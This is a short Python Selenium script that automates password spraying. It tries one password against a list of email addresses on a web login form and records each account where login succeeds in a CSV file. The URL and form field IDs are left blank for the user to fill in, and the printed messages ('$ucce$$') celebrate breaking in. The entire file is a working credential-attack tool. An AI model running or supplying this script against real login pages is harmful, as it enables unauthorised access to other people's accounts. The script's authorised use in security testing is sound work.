from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import csv
from csv import writer

#enter list of emails on line 8
myAdminEmail = []
#enter the password you want to test with on line 10
myAdminPassword = ""

driver = webdriver.Chrome()
#main function
def login(url,usernameId,username,passwordId,password,submit_buttonId):
    #enter the URL after successful login on line 16
    actualUrl= ""

    driver.get(url)
    driver.find_element(By.ID, usernameId).send_keys(username)
    driver.find_element(By.ID, passwordId).send_keys(password)
    driver.find_element(By.ID, submit_buttonId).click()
    #line 23 gets the current URL
    expectedUrl = driver.current_url
    #line 25 validates URL post login, if succesful, it adds username to csv
    if expectedUrl == actualUrl:
        print("$$$ ",username, " is attempting $$$")
        with open('success.csv', 'a') as f:
            writer = csv.writer(f)
            writer.writerow([username])
            f.close()
        print("$ucce$$ with ",username)
    else:
        print("Pw did not work for ",username)

i=0
#call the login() function, iterate through each email in list
while i < len(myAdminEmail):
    #on 38 enter url to log into, id of usernameId, myAdminEmail[i], passwordId, myAdminPassword, id of login/submit button
    login("", '', myAdminEmail[i], '', myAdminPassword, '')
    time.sleep(4)
    i = i + 1
